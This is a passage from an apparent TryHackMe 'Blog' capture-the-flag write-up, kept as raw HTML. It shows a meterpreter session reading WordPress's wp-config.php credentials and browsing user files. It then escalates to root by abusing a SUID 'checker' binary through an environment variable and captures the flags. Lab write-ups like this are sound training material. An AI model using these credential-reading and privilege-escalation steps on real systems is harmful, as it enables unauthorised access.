+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+</pre><td class="rouge-code"><pre>meterpreter <span class="o">&gt;</span> <span class="nb">cat </span>wp-config.php
+&lt;?php
+/<span class="k">**</span>
+ <span class="k">*</span> The base configuration <span class="k">for </span>WordPress
+ <span class="k">*</span>
+ <span class="k">*</span> The wp-config.php creation script uses this file during the
+ <span class="k">*</span> installation. You don<span class="s1">'t have to use the web site, you can
+ * copy this file to "wp-config.php" and fill in the values.
+ *
+ * This file contains the following configurations:
+ *
+ * * MySQL settings
+ * * Secret keys
+ * * Database table prefix
+ * * ABSPATH
+ *
+ * @link https://codex.wordpress.org/Editing_wp-config.php
+ *
+ * @package WordPress
+ */
+
+/* Custom */
+/*
+define('</span>WP_HOME<span class="s1">', '</span>/<span class="s1">');
+define('</span>WP_SITEURL<span class="s1">', '</span>/<span class="s1">'); */
+
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define('</span>DB_NAME<span class="s1">', '</span>blog<span class="s1">');
+
+/** MySQL database username */
+define('</span>DB_USER<span class="s1">', '</span>wordpressuser<span class="s1">');
+
+/** MySQL database password */
+define('</span>DB_PASSWORD<span class="s1">', '</span>redacted<span class="s1">');
+
+/** MySQL hostname */
+define('</span>DB_HOST<span class="s1">', '</span>localhost<span class="s1">');
+...
+</span></pre></table></code></div></div><p>Voila, we got the password for mr. <code class="language-plaintext highlighter-rouge">bjoel</code> also. Now we can easily login in his wordpress account.</p><p><img data-src="/assets/Blog/bjoel-login.png" alt="bjoel wordpress login" data-proofer-ignore></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+</pre><td class="rouge-code"><pre>meterpreter <span class="o">&gt;</span> <span class="nb">cd </span>home
+meterpreter <span class="o">&gt;</span> <span class="nb">ls
+</span>Listing: /home
+<span class="o">==============</span>
+
+Mode              Size  Type  Last modified              Name
+<span class="nt">----</span>              <span class="nt">----</span>  <span class="nt">----</span>  <span class="nt">-------------</span>              <span class="nt">----</span>
+040755/rwxr-xr-x  4096  <span class="nb">dir   </span>2020-05-27 01:38:48 +0530  bjoel
+
+meterpreter <span class="o">&gt;</span> <span class="nb">cd </span>bjoel
+meterpreter <span class="o">&gt;</span> <span class="nb">ls
+</span>Listing: /home/bjoel
+<span class="o">====================</span>
+
+Mode              Size   Type  Last modified              Name
+<span class="nt">----</span>              <span class="nt">----</span>   <span class="nt">----</span>  <span class="nt">-------------</span>              <span class="nt">----</span>
+020666/rw-rw-rw-  0      cha   2022-05-01 17:23:21 +0530  .bash_history
+100644/rw-r--r--  220    fil   2018-04-05 00:00:26 +0530  .bash_logout
+100644/rw-r--r--  3771   fil   2018-04-05 00:00:26 +0530  .bashrc
+040700/rwx------  4096   <span class="nb">dir   </span>2020-05-25 18:45:58 +0530  .cache
+040700/rwx------  4096   <span class="nb">dir   </span>2020-05-25 18:45:58 +0530  .gnupg
+100644/rw-r--r--  807    fil   2018-04-05 00:00:26 +0530  .profile
+100644/rw-r--r--  0      fil   2020-05-25 18:46:22 +0530  .sudo_as_admin_successful
+100644/rw-r--r--  69106  fil   2020-05-27 00:03:24 +0530  Billy_Joel_Termination_May20-2020.pdf
+100644/rw-r--r--  57     fil   2020-05-27 01:38:47 +0530  user.txt
+
+meterpreter <span class="o">&gt;</span> <span class="nb">cat </span>user.txt
+You won<span class="s1">'t find what you'</span>re looking <span class="k">for </span>here.
+
+TRY HARDER
+meterpreter <span class="o">&gt;</span> download Billy_Joel_Termination_May20-2020.pdf
+</pre></table></code></div></div><p>We can’t get the user.txt flag that easily.. .There is an interesting file <code class="language-plaintext highlighter-rouge">Billy_Joel_Termination_May20-2020.pdf</code>. Let’s download this file into our system and check it out.</p><p><img data-src="/assets/Blog/rubber-ducky.png" alt="rubber ducky pdf file" data-proofer-ignore></p><p>Oooh, something tells me that we have to look into the <code class="language-plaintext highlighter-rouge">/media</code> folder..!</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre>meterpreter <span class="o">&gt;</span> <span class="nb">cd </span>media
+meterpreter <span class="o">&gt;</span> <span class="nb">ls
+</span>Listing: /media
+<span class="o">===============</span>
+
+Mode              Size  Type  Last modified              Name
+<span class="nt">----</span>              <span class="nt">----</span>  <span class="nt">----</span>  <span class="nt">-------------</span>              <span class="nt">----</span>
+040700/rwx------  4096  <span class="nb">dir   </span>2020-05-29 00:54:09 +0530  usb
+
+meterpreter <span class="o">&gt;</span> <span class="nb">cd </span>usb
+<span class="o">[</span>-] stdapi_fs_chdir: Operation failed: 1
+meterpreter <span class="o">&gt;</span> 
+</pre></table></code></div></div><p>As expected, we need root level access. Now, the time is for some privilege escalation.</p><h2 id="privilege-escalation"><span class="mr-2">Privilege Escalation</span><a href="#privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="binary-exploit"><span class="mr-2">Binary Exploit</span><a href="#binary-exploit" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+</pre><td class="rouge-code"><pre>meterpreter <span class="o">&gt;</span> shell
+Process 4684 created.
+Channel 5 created.
+
+<span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="nb">sudo</span>: no <span class="nb">tty </span>present and no askpass program specified
+
+find / <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-type</span> f <span class="nt">-exec</span> <span class="nb">ls</span> <span class="nt">-la</span> <span class="o">{}</span> 2&gt;/dev/null <span class="se">\;</span>
+<span class="nt">-rwsr-xr-x</span> 1 root root 59640 Mar 22  2019 /usr/bin/passwd
+<span class="nt">-rwsr-xr-x</span> 1 root root 40344 Mar 22  2019 /usr/bin/newgrp
+<span class="nt">-rwsr-xr-x</span> 1 root root 75824 Mar 22  2019 /usr/bin/gpasswd
+<span class="nt">-rwsr-xr-x</span> 1 root root 44528 Mar 22  2019 /usr/bin/chsh
+<span class="nt">-rwsr-xr-x</span> 1 root root 37136 Mar 22  2019 /usr/bin/newuidmap
+<span class="nt">-rwsr-xr-x</span> 1 root root 22520 Mar 27  2019 /usr/bin/pkexec
+<span class="nt">-rwsr-xr-x</span> 1 root root 76496 Mar 22  2019 /usr/bin/chfn
+<span class="nt">-rwsr-xr-x</span> 1 root root 149080 Jan 31  2020 /usr/bin/sudo
+<span class="nt">-rwsr-sr-x</span> 1 daemon daemon 51464 Feb 20  2018 /usr/bin/at
+<span class="nt">-rwsr-xr-x</span> 1 root root 37136 Mar 22  2019 /usr/bin/newgidmap
+<span class="nt">-rwsr-xr-x</span> 1 root root 18448 Jun 28  2019 /usr/bin/traceroute6.iputils
+<span class="nt">-rwsr-sr-x</span> 1 root root 8432 May 26  2020 /usr/sbin/checker
+<span class="nt">-rwsr-xr-x</span> 1 root root 100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+<span class="nt">-rwsr-xr--</span> 1 root messagebus 42992 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+<span class="nt">-rwsr-sr-x</span> 1 root root 109432 Oct 30  2019 /usr/lib/snapd/snap-confine
+<span class="nt">-rwsr-xr-x</span> 1 root root 14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
+<span class="nt">-rwsr-xr-x</span> 1 root root 436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
+<span class="nt">-rwsr-xr-x</span> 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+<span class="nt">-rwsr-xr-x</span> 1 root root 43088 Mar  5  2020 /bin/mount
+<span class="nt">-rwsr-xr-x</span> 1 root root 30800 Aug 11  2016 /bin/fusermount
+<span class="nt">-rwsr-xr-x</span> 1 root root 26696 Mar  5  2020 /bin/umount
+<span class="nt">-rwsr-xr-x</span> 1 root root 64424 Jun 28  2019 /bin/ping
+<span class="nt">-rwsr-xr-x</span> 1 root root 44664 Mar 22  2019 /bin/su
+<span class="nt">-rwsr-xr-x</span> 1 root root 40152 Oct 10  2019 /snap/core/8268/bin/mount
+<span class="nt">-rwsr-xr-x</span> 1 root root 44168 May  7  2014 /snap/core/8268/bin/ping
+<span class="nt">-rwsr-xr-x</span> 1 root root 44680 May  7  2014 /snap/core/8268/bin/ping6
+...
+</pre></table></code></div></div><p>Ran the find SUID binary command and we have one interesting binary here, which is <code class="language-plaintext highlighter-rouge">checker</code>.</p><p>We’ll try to run this binary</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>python <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/sh")'</span>
+<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm-256color
+<span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm-256color
+<span class="nv">$ </span>/usr/sbin/checker         
+/usr/sbin/checker
+Not an Admin
+</pre></table></code></div></div><p>Interesting..! Let’s check the workings via strings</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>strings /usr/sbin/checker
+strings /usr/sbin/checker
+/lib64/ld-linux-x86-64.so.2
+libc.so.6
+setuid
+puts
+getenv
+system
+__cxa_finalize
+__libc_start_main
+GLIBC_2.2.5
+_ITM_deregisterTMCloneTable
+__gmon_start__
+_ITM_registerTMCloneTable
+<span class="o">=</span>9       
+AWAVI
+AUATL
+<span class="o">[]</span>A<span class="se">\A</span><span class="o">]</span>A^A_
+admin
+/bin/bash
+Not an Admin
+<span class="p">;</span><span class="k">*</span>3<span class="s2">$"
+GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
+crtstuff.c
+...
+</span></pre></table></code></div></div><p>Seems like it is validating that there is an admin in the env or not by invoking <code class="language-plaintext highlighter-rouge">getenv</code>. Let’s play with this binary and do some manual exploit.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">export </span><span class="nv">admin</span><span class="o">=</span>1
+<span class="nb">export </span><span class="nv">admin</span><span class="o">=</span>1
+<span class="nv">$ </span>/usr/sbin/checker
+/usr/sbin/checker
+root@blog:/media# <span class="nb">whoami
+whoami
+</span>root
+root@blog:/media# 
+</pre></table></code></div></div><p>Boom..! we are now root..!</p><p>Getting the user.txt flag</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre>root@blog:/media# <span class="nb">cd </span>usb
+<span class="nb">cd </span>usb
+root@blog:/media/usb# <span class="nb">ls
+ls
+</span>user.txt
+root@blog:/media/usb# <span class="nb">cat </span>user.txt
+<span class="nb">cat </span>user.txt
+redacted
+root@blog:/media/usb# 
+</pre></table></code></div></div><p>Getting the root.txt flag</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre><td class="rouge-code"><pre>root@blog:/media/usb# find / <span class="nt">-name</span> root.txt
+find / <span class="nt">-name</span> root.txt
+/root/root.txt
+find: <span class="s1">'/proc/4500/task/4500/net'</span>: Invalid argument
+find: <span class="s1">'/proc/4500/net'</span>: Invalid argument
+find: <span class="s1">'/proc/4719/task/4719/net'</span>: Invalid argument
+find: <span class="s1">'/proc/4719/net'</span>: Invalid argument
+find: <span class="s1">'/proc/4807/task/4807/net'</span>: Invalid argument
+find: <span class="s1">'/proc/4807/net'</span>: Invalid argument
+root@blog:/media/usb# <span class="nb">cat</span> /root/root.txt
+<span class="nb">cat</span> /root/root.txt
+redacted
+root@blog:/media/usb# 
+</pre></table></code></div></div><p>That’s it folks, this was all about the Blog box.</p><p>Thank you so much for being till the end. See you guys next time…!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/tryhackme/'>Tryhackme</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/tryhackme/" class="post-tag no-text-decoration" >tryhackme</a> <a href="/tags/wordpress/" class="post-tag no-text-decoration" >wordpress</a> <a href="/tags/wpscan/" class="post-tag no-text-decoration" >wpscan</a> <a href="/tags/nmap/" class="post-tag no-text-decoration" >nmap</a> <a href="/tags/steghide/" class="post-tag no-text-decoration" >steghide</a> <a href="/tags/hydra/" class="post-tag no-text-decoration" >hydra</a> <a href="/tags/cve/" class="post-tag no-text-decoration" >cve</a> <a href="/tags/smb/" class="post-tag no-text-decoration" >smb</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/tags/smbclient/" class="post-tag no-text-decoration" >smbclient</a> <a href="/tags/msfconsole/" class="post-tag no-text-decoration" >msfconsole</a> <a href="/tags/gobuster/" class="post-tag no-text-decoration" >gobuster</a> <a href="/tags/nikto/" class="post-tag no-text-decoration" >nikto</a> <a href="/tags/smbmap/" class="post-tag no-text-decoration" >smbmap</a> <a href="/tags/binary-exploit/" class="post-tag no-text-decoration" >binary exploit</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> Keep Xploiting</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=THM+-+Blog+-+Xp10i7&url=https%3A%2F%2Fxp10i7.github.io%2Fposts%2FTHM-Blog%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=THM+-+Blog+-+Xp10i7&u=https%3A%2F%2Fxp10i7.github.io%2Fposts%2FTHM-Blog%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fxp10i7.github.io%2Fposts%2FTHM-Blog%2F&text=THM+-+Blog+-+Xp10i7" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/THM-Blog/">THM - Blog</a><li><a href="/posts/THM-Tech_Supp0rt1/">THM - Tech_Supp0rt:1</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/gobuster/">gobuster</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/nikto/">nikto</a> <a class="post-tag" href="/tags/nmap/">nmap</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/smbclient/">smbclient</a> <a class="post-tag" href="/tags/smbmap/">smbmap</a> <a class="post-tag" href="/tags/tryhackme/">tryhackme</a> <a class="post-tag" href="/tags/wordpress/">wordpress</a> <a class="post-tag" href="/tags/wpscan/">wpscan</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/THM-Tech_Supp0rt1/"><div class="card-body"> <em class="small" data-ts="1651343400" data-df="ll" > May 1, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>THM - Tech_Supp0rt:1</h3><div class="text-muted small"><p> Tech_Supp0rt: 1 About The Room Hack into the scammer’s under-development website to foil their plans. Url: https://tryhackme.com/room/techsupp0rt1 Creator: Vikaran Difficulty: Easy Reconna...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"><div class="btn btn-outline-primary disabled" prompt="Older"><p>-</p></div><a href="/posts/THM-Tech_Supp0rt1/" class="btn btn-outline-primary" prompt="Newer"><p>THM - Tech_Supp0rt:1</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="">54ny4m Xp10i7</a>. <span data-toggle="tooltip" data-placement="top" title="">Source by <a href="https://github.com/cotes2020" target="_blank"> Cotes Chung</a></span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank">Jekyll</a> with love.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/gobuster/">gobuster</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/nikto/">nikto</a> <a class="post-tag" href="/tags/nmap/">nmap</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/smbclient/">smbclient</a> <a class="post-tag" href="/tags/smbmap/">smbmap</a> <a class="post-tag" href="/tags/tryhackme/">tryhackme</a> <a class="post-tag" href="/tags/wordpress/">wordpress</a> <a class="post-tag" href="/tags/wpscan/">wpscan</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script> /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */ MathJax = { tex: { inlineMath: [ /* start/end delimiter pairs for in-line math */ ['$','$'], ['\\(','\\)'] ], displayMath: [ /* start/end delimiter pairs for display math */ ['$$', '$$'], ['\\[', '\\]'] ] } }; </script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"> </script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
